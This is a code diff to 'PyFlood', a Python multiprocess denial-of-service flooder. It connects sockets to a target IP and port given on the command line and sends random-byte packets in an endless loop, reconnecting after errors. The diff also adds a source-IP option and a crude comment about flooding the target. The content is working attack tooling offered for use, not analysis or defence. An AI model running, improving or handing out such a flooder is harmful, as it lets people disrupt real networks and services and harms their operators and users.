@@ -3,7 +3,6 @@ import socket
 import sys
 import multiprocessing
 import random
-import string
 import floodtypes
 
 
@@ -13,6 +12,7 @@ class PyFlood(multiprocessing.Process):
 		self.ip = ip
 		self.port = port
 		self.flood_type = flood_type
+		self.packet_size = 256
 
 	def run(self):
 		flood_type = floodtypes.FloodTypes().get_by_type(self.flood_type)
@@ -21,19 +21,34 @@ class PyFlood(multiprocessing.Process):
 		self.start_flood(flood_type)
 
 	def start_flood(self, flood_type):
-		while 1:
-			try:
-				s = socket.socket(socket.AF_INET, flood_type.get_socket_type())
-				msg = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(2048))
-				s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 20)
-				s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-				s.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_TTL, 20)
-				s.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_LOOP, 1)
+		s = socket.socket(socket.AF_INET, flood_type.get_socket_type())
+		msg_bytes = random._urandom(int(self.packet_size))
 
-				s.sendto(msg.encode('utf-8'), (self.ip, int(self.port)))
-			except socket.error:
-				print('Socket error')
-				sys.exit()
+		# Try to establish a connection
+		try:
+			s.connect((self.ip, int(self.port)))
+		except socket.error:
+			print("Socket error")
+			sys.exit()
+
+		s.settimeout(None)
+
+		# Flood that bitcheh
+		try:
+			while True:
+				try:
+					for option in flood_type.get_socket_options():
+						s.setsockopt(option.get('level'), option.get('option'), option.get('value'))
+					s.sendto(msg_bytes, (self.ip, int(self.port)))
+				except socket.error:
+					try:
+						s.close()
+						s = socket.socket(socket.AF_INET, flood_type.get_socket_type())
+						s.connect((self.ip, int(self.port)))
+					except socket.error:
+						print('Reconnecting...')
+		except KeyboardInterrupt:
+			sys.exit()
 
 
 parser = argparse.ArgumentParser()
@@ -41,6 +56,7 @@ parser.add_argument('ip', help='Target IP address', type=str)
 parser.add_argument('port', help='Target Port', type=str)
 parser.add_argument('type', help='Flood type', type=int)
 parser.add_argument('--procs', help='Number of processes', type=int)
+parser.add_argument('--source', help='Source IP address', type=str)
 parser.add_argument('--list', help='List of flood types', action='store_true')
 args = parser.parse_args()
 jobs = []
@@ -50,7 +66,7 @@ if __name__ == '__main__':
 		ft = floodtypes.FloodTypes
 		for floodType in ft.get_types():
 			print(str(floodType.get_type_id()), ': ' + floodType.get_name())
-			sys.exit()
+		sys.exit()
 	elif args.ip and args.port and args.type and args.procs:
 		print('Starting flood on %s processes...' % args.procs)
 		for i in range(0, args.procs):
